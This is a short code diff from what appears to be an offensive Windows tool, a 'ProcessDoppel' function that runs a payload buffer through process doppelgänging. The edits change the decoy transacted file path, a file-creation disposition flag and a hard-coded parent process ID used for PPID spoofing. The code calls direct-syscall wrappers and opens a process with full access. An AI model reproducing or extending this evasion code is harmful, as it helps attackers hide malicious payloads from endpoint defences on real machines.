@@ -251,9 +251,9 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
     UNICODE_STRING fileName;
     
     ZeroMemory(&block, sizeof(IO_STATUS_BLOCK));
-    RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\Users\\Public\\calc.exe");
+    RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\Users\\Public\\nonexistant.exe");
     InitializeObjectAttributes(&fileAttributes, &fileName, 0x00000040, NULL, NULL);
-    status = SysNtCreateFile10(&hTransactedFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &fileAttributes, &block, nullptr, FILE_ATTRIBUTE_NORMAL, 0, 0x00000001, 0x00000020, NULL, 0);
+    status = SysNtCreateFile10(&hTransactedFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &fileAttributes, &block, nullptr, FILE_ATTRIBUTE_NORMAL, 0, 0x00000003, 0x00000020, NULL, 0);
 
     transaction = pfnRtlSetCurrentTransaction(nullptr);
 
@@ -286,7 +286,7 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
     InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
 
     CLIENT_ID clientId = { 0 };
-    clientId.UniqueProcess = (HANDLE)18440; // PPID
+    clientId.UniqueProcess = (HANDLE)16120; // PPID
     clientId.UniqueThread = (HANDLE)0;
 
     status = SysNtOpenProcess10(&hParent, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
